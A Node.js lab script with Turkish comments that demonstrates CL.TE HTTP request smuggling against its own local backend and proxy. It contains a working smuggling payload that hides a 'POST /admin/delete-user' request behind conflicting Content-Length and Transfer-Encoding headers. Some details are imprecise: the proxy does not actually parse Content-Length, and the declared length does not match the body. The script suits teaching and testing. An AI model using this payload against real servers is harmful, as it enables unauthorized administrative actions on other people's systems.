const net = require("net");

// 1. BACK-END SUNUCUSU (TE / Chunked Öncelikli Ayrıştırıcı)
const backendServer = net.createServer((socket) => {
  let buffer = "";

  // Gelen veriyi oku ve ayrıştır
  socket.on("data", (chunk) => {
    buffer += chunk.toString(); // Gelen veriyi tamponla
    console.log("[BACKEND] Gelen veri tamponlandı:\n" + buffer.trim());
    while (buffer.includes("\r\n\r\n")) {
      // Header'lar bitti mi kontrol et
      // Header'ları ayır
      const headerEnd = buffer.indexOf("\r\n\r\n");
      const headersPart = buffer.slice(0, headerEnd);
      const isChunked = /transfer-encoding:\s*chunked/i.test(headersPart); // TE var mı?

      if (isChunked) {
        // Chunked parsing: 0\r\n\r\n görünce bu istek biter
        console.log("[BACKEND] Chunked Transfer-Encoding isteği algılandı.");
        const bodyPart = buffer.slice(headerEnd + 4);
        const zeroChunk = bodyPart.indexOf("0\r\n\r\n");
        // 0 chunk'ı bulduysak, bu istek bitti demektir
        if (zeroChunk !== -1) {
          // Tam isteği ayır ve kalan baytları tamponla
          const reqLength = headerEnd + 4 + zeroChunk + 5;
          const fullRequest = buffer.slice(0, reqLength);
          buffer = buffer.slice(reqLength); // Kalan baytlar backend TCP soketinde asılı kalır!

          console.log(
            "[BACKEND] İstek 1 (Meşru Görünen) İşlendi, ancak sonraki istek zehirlendi: cunku 0 chunk'ı görünce backend bunu bitmiş saydı ve alt satırdaki istek zehirlendi.",
          );
          console.log("   --> " + fullRequest.trim().split("\r\n")[0]);

          // Backend yanıtı gönder, ancak bu yanıt istemciye giderken, istemcinin sonraki isteği (zehirlenmiş) backend'e ulaşır.
          socket.write(
            "HTTP/1.1 200 OK\r\nContent-Length: 15\r\nConnection: keep-alive\r\n\r\nBackend Yanıtı\n",
          );
        } else {
          break;
        }
      } else {
        // Normal Content-Length okuması
        console.log("[BACKEND] Content-Length isteği algılandı.");
        const clMatch = headersPart.match(/content-length:\s*(\d+)/i);
        const cl = clMatch ? parseInt(clMatch[1], 10) : 0;
        // Eğer buffer'da yeterli veri varsa, tam isteği ayır ve kalan baytları tamponla
        if (buffer.length >= headerEnd + 4 + cl) {
          const fullRequest = buffer.slice(0, headerEnd + 4 + cl);
          buffer = buffer.slice(headerEnd + 4 + cl);

          console.log(
            "\n[BACKEND] İstek 2 (ZEHİRLENMİŞ / KAÇIRILMIŞ İSTEK) İşlendi ve backend bunu zehirlenmiş olarak gördü.",
          );
          console.log("   --> " + fullRequest.trim().split("\r\n")[0]);

          // Backend yanıtı gönder
          socket.write(
            "HTTP/1.1 200 OK\r\nContent-Length: 16\r\nConnection: close\r\n\r\nAdmin İslem OK\n",
          );
        } else {
          break;
        }
      }
    }
  });
});

// Dinamik portlarla başlat (Port çakışmasını önle)
backendServer.listen(0, "127.0.0.1", () => {
  const backendPort = backendServer.address().port;

  // 2. FRONT-END PROXY (CL Öncelikli Ayrıştırıcı)
  const proxyServer = net.createServer((clientSocket) => {
    // Gelen istemci bağlantısını backend'e yönlendir
    const backendSocket = net.connect(
      { host: "127.0.0.1", port: backendPort },
      () => {
        // İstemciden gelen veriyi backend'e ilet
        clientSocket.on("data", (data) => {
          backendSocket.write(data);
        });
        // Backend'den gelen yanıtı istemciye ilet
        backendSocket.on("data", (data) => {
          clientSocket.write(data);
        });
      },
    );

    clientSocket.on("error", () => {});
    backendSocket.on("error", () => {});
  });

  // Proxy sunucusunu başlat
  proxyServer.listen(0, "127.0.0.1", () => {
    const proxyPort = proxyServer.address().port;
    console.log(
      `[+] Back-end Port: ${backendPort} | Front-end Proxy Port: ${proxyPort}`,
    );
    console.log(
      "[*] Laboratuvar hazır, CL.TE Smuggling atağı başlatılıyor...\n",
    );

    // 3. İSTEMCİ / SALDIRGAN: Hazır olunca doğrudan bağlanır
    const client = net.connect({ host: "127.0.0.1", port: proxyPort }, () => {
      // Smuggled Payload:
      // Proxy CL: 52 bayt görür -> Hepsini tek istek sanıp backend'e pompalar.
      // Backend TE: 0 chunk'ı görünce ilk isteği bitirir, alt satırı sıradaki istek sanır ve işler.
      // Backend TE görür -> 0\r\n\r\n görünce durur. "POST /admin/delete-user..." alt satırdaki istek sanılır ve işlenir."
      const payload =
        "POST / HTTP/1.1\r\n" +
        "Host: localhost\r\n" +
        "Content-Length: 52\r\n" +
        "Transfer-Encoding: chunked\r\n" +
        "\r\n" +
        "0\r\n" +
        "\r\n" +
        "POST /admin/delete-user HTTP/1.1\r\n" +
        "Host: localhost\r\n\r\n";

      console.log(
        "[SALDIRGAN] 1. Aşama: Smuggling payload'ı gönderildi. ve 1 saniye sonra masum kullanıcının isteği (GET /index) gönderilecek.",
      );
      client.write(payload); // Smuggling payload'ı gönder

      // 1 saniye sonra masum kullanıcının isteği gelir:
      console.log(
        "[SALDIRGAN] 2. Aşama: bekleniyor... 1 saniye sonra masum kullanıcının isteği (GET /index) gönderilecek.",
      );
      client.write("GET /index HTTP/1.1\r\nHost: localhost\r\n\r\n"); // Masum kullanıcının isteği
      setTimeout(() => {
        console.log(
          "[MASUM KULLANICI] 2. Aşama: GET /index isteği gönderiyor, ancak backend bunu zehirlenmiş olarak algılar ve alt satırdaki isteği işler.",
        );
        client.write("GET /index HTTP/1.1\r\nHost: localhost\r\n\r\n"); // Masum kullanıcının isteği
      }, 1000);
    });

    let responsesReceived = 0;
    // Gelen yanıtları dinle
    client.on("data", (data) => {
      responsesReceived++;
      console.log(
        `[İSTEMCİ] Yanıt #${responsesReceived} Geldi:\n` +
          data.toString().trim(),
      );
      if (responsesReceived >= 2) {
        // İki yanıt alındı, saldırı başarılı, çıkış yap
        console.log(
          "\n[+] SONUÇ: HTTP Request Smuggling başarılı! İkinci istek zehirlendi.",
        );
        client.destroy();
        proxyServer.close();
        backendServer.close();
        process.exit(0);
      }
    });

    client.on("error", (err) => {
      console.error("[-] İstemci Hatası:", err.message);
      process.exit(1);
    });
  });
});
